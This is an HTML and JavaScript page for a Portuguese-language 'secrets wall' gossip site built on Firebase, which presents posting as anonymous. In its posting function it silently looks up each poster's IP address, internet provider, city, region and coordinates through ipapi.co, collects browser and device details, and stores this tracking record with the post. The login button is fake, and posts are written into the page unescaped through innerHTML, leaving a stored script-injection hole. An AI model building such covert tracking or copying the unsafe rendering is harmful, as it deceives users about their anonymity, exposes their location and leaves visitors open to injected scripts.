<!DOCTYPE html>
<html lang="pt-br">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XOXO - O Mural dos Segredos</title>
    
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.17.1/firebase-firestore-compat.js"></script>

    <style>
        :root { --deep-black: #050505; }
        body { margin: 0; background-color: var(--deep-black); color: #ddd; font-family: 'Courier New', monospace; overflow-x: hidden; }
        .hero { height: 40vh; background-image: linear-gradient(rgba(0,0,0,0.6), var(--deep-black)), url('https://images.unsplash.com/photo-1599661046827-dacff0c0f09a?auto=format&fit=crop&w=1000&q=80'); background-size: cover; background-position: center; display: flex; flex-direction: column; justify-content: center; align-items: center; text-align: center; }
        .hero h1 { font-size: 5rem; margin: 0; color: #ccc; letter-spacing: 12px; }
        #login-screen { display: flex; flex-direction: column; align-items: center; padding: 50px; }
        .btn-login { background: #333; color: white; padding: 15px 30px; cursor: pointer; border: 1px solid #555; text-transform: uppercase; transition: 0.3s; }
        .btn-login:hover { background: #555; }
        #feed-container { display: none; padding: 20px; max-width: 600px; margin: auto; }
        .input-box { background: #111; padding: 20px; border: 1px solid #333; margin-bottom: 30px; }
        textarea { width: 100%; background: transparent; border: none; color: #aaa; font-size: 1.1rem; outline: none; font-family: inherit; resize: none; }
        .btn-post { background: #222; color: #999; border: 1px solid #444; padding: 10px 20px; float: right; cursor: pointer; }
        .btn-post:disabled { opacity: 0.5; cursor: wait; }
        .fofoca-card { background: #0d0d0d; padding: 20px; margin-bottom: 15px; border-left: 3px solid #444; animation: fadeIn 0.5s ease; }
        @keyframes fadeIn { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
    </style>
</head>
<body>

    <header class="hero">
        <h1>XOXO</h1>
        <p>Segredos que o sil√™ncio guarda.</p>
    </header>

    <div id="login-screen">
        <h3>Entre no mural... se tiver coragem.</h3>
        <button class="btn-login" onclick="fakeLogin()">Aceder ao Mural</button>
    </div>

    <div id="feed-container">
        <div class="input-box">
            <textarea id="fofocaInput" rows="3" placeholder="O que voc√™ sabe que ningu√©m mais sabe?"></textarea>
            <button class="btn-post" id="btnEnviar" onclick="enviarFofoca()">Soltar o Verbo!</button>
            <div style="clear: both;"></div>
        </div>
        <div id="mural"></div>
    </div>

    <script>
        // CONFIGURA√á√ÉO DO SEU FIREBASE
        var firebaseConfig = {
            apiKey: "AIzaSyC_RKEhHxEvgDN0w7X1AMAwE0a4ljiSbh4",
            authDomain: "xoxo-fofocas.firebaseapp.com",
            projectId: "xoxo-fofocas",
            storageBucket: "xoxo-fofocas.firebasestorage.app",
            messagingSenderId: "730968176054",
            appId: "1:730968176054:web:fcabf0465b189fddbdbd17",
            measurementId: "G-3DZPC3E7SV"
        };

        firebase.initializeApp(firebaseConfig);
        var db = firebase.firestore();

        function fakeLogin() {
            document.getElementById('login-screen').style.display = 'none';
            document.getElementById('feed-container').style.display = 'block';
            carregarFofocas();
        }

        // FUN√á√ÉO DE RASTREIO E ENVIO FUNDIDA
        function enviarFofoca() {
            var inputElement = document.getElementById('fofocaInput');
            var btn = document.getElementById('btnEnviar');
            var texto = inputElement.value;
            
            if (texto.trim() === "") {
                alert("Escreva algo antes de enviar!");
                return;
            }

            btn.disabled = true;
            btn.innerText = "Rastreando...";

            // 1. Coleta de dados t√©cnicos b√°sicos
            var infoTecnica = {
                plataforma: navigator.platform,
                idioma: navigator.language,
                tela: window.screen.width + "x" + window.screen.height,
                agente: navigator.userAgent
            };

            // 2. Uso de JSONP para evitar "Localiza√ß√£o Bloqueada"
            var script = document.createElement('script');
            // Usando IP-API via JSONP (o navegador permite este tipo de requisi√ß√£o)
            script.src = 'https://ipapi.co/jsonp/callback=receberRastroEEnviar';
            document.body.appendChild(script);

            // Esta fun√ß√£o ser√° chamada automaticamente quando o script acima carregar
            window.receberRastroEEnviar = function(data) {
                var rastroCompleto = {
                    ip: data.ip || "N√£o identificado",
                    provedor_wifi: data.org || "N√£o identificado",
                    cidade: data.city || "Desconhecida",
                    estado: data.region || "Desconhecido",
                    latitude: data.latitude || 0,
                    longitude: data.longitude || 0,
                    tecnico: infoTecnica
                };

                // 3. Salvando no Firebase com o rastro completo
                db.collection("fofocas").add({
                    conteudo: texto,
                    data: firebase.firestore.FieldValue.serverTimestamp(),
                    rastro: rastroCompleto
                })
                .then(function() {
                    inputElement.value = "";
                    alert("Segredo espalhado com rastro capturado!");
                })
                .catch(function(error) {
                    console.error("Erro Firebase:", error);
                    alert("Erro ao enviar. Verifique as regras do Firebase.");
                })
                .finally(function() {
                    btn.disabled = false;
                    btn.innerText = "Soltar o Verbo!";
                    // Remove o script tempor√°rio
                    if(script.parentNode) document.body.removeChild(script);
                });
            };
        }

        function carregarFofocas() {
            db.collection("fofocas").orderBy("data", "desc").onSnapshot(function(snapshot) {
                var mural = document.getElementById('mural');
                mural.innerHTML = "";
                snapshot.forEach(function(doc) {
                    var f = doc.data();
                    var div = document.createElement('div');
                    div.className = 'fofoca-card';
                    div.innerHTML = '<small style="color: #555;">üì¢ Algu√©m sussurrou...</small><p>' + f.conteudo + '</p>';
                    mural.appendChild(div);
                });
            });
        }
    </script>
</body>
</html>
